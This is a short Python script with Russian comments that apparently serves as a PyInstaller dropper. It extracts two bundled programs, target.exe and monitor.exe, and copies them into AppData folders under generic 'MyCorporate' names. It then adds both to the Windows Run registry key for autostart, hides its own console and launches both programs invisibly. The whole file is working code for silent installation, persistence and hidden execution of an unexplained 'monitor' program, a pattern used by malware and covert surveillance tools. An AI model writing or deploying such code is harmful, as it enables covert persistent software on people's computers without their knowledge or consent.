import os
import sys
import winreg
import subprocess
import shutil
from importlib import resources

def get_resource_path(resource_name):
    """Получает путь к ресурсу, встроенному PyInstaller"""
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, resource_name)
    else:
        return resource_name

def copy_exe_to_target_dir():
    """Копирует target.exe и monitor.exe в соответствующие директории"""
    target_dir = os.path.expanduser("~/AppData/Roaming/MyCorporateApp")
    monitor_dir = os.path.expanduser("~/AppData/Roaming/MyCorporateMonitor")
    target_exe_path = os.path.join(target_dir, "target.exe")
    monitor_exe_path = os.path.join(monitor_dir, "monitor.exe")

    # Создаем директории
    os.makedirs(target_dir, exist_ok=True)
    os.makedirs(monitor_dir, exist_ok=True)

    # Копируем target.exe
    try:
        source_target_exe = get_resource_path("target.exe")
        if not os.path.exists(source_target_exe):
            raise FileNotFoundError("Встроенный target.exe не найден")
        shutil.copy2(source_target_exe, target_exe_path)
        print(f"target.exe скопирован в {target_exe_path}")
    except Exception as e:
        print(f"Ошибка при копировании target.exe: {str(e)}")
        sys.exit(1)

    # Копируем monitor.exe
    try:
        source_monitor_exe = get_resource_path("monitor.exe")
        if not os.path.exists(source_monitor_exe):
            raise FileNotFoundError("Встроенный monitor.exe не найден")
        shutil.copy2(source_monitor_exe, monitor_exe_path)
        print(f"monitor.exe скопирован в {monitor_exe_path}")
    except Exception as e:
        print(f"Ошибка при копировании monitor.exe: {str(e)}")
        sys.exit(1)

    return target_dir, target_exe_path, monitor_dir, monitor_exe_path

def add_to_startup(exe_path, name):
    """Добавляет указанный .exe в автозагрузку с заданным именем"""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(key)
        print(f"{name} добавлен в автозагрузку")
    except Exception as e:
        print(f"Ошибка при добавлении {name} в автозагрузку: {str(e)}")
        sys.exit(1)

def run_exe_hidden(exe_path):
    """Запускает .exe без видимого окна"""
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        subprocess.Popen(exe_path, startupinfo=startupinfo)
        print(f"Программа {exe_path} запущена в фоновом режиме")
    except Exception as e:
        print(f"Ошибка при запуске {exe_path}: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    # Скрываем консольное окно при запуске .exe
    if hasattr(sys, 'frozen'):
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    # Копируем оба .exe в соответствующие директории
    target_dir, target_exe_path, monitor_dir, monitor_exe_path = copy_exe_to_target_dir()

    # Добавляем в автозагрузку
    add_to_startup(target_exe_path, "MyCorporateApp")
    add_to_startup(monitor_exe_path, "MyCorporateMonitor")

    # Запускаем оба .exe в фоновом режиме
    run_exe_hidden(target_exe_path)
    run_exe_hidden(monitor_exe_path)
